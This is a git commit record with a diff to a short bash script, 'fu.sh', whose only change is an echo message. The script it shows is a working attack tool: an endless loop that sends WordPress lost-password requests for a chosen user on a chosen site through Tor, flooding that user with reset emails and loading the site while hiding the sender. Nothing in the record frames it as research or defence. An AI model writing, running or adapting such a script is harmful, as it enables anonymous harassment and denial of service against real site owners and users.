f890fe12669e9a99e8ae5ddc6c264cd5bbf0ea88
nobody246 <a.se8seven@gmail.com>
2019-01-21 22:44:40 -0500

    Update fu.sh

--- fu.sh
+++ fu.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 while true
 do
- echo "Requesting another new password for user $2 on $1..."
+ echo "Requesting another password reset for user $2 on $1..."
  torify curl -d "redirect_to=&user_login=$2&wp-submit=Get+New+Password" $1/wp-login.php?action=lostpassword &		
  sleep $3;
 done;
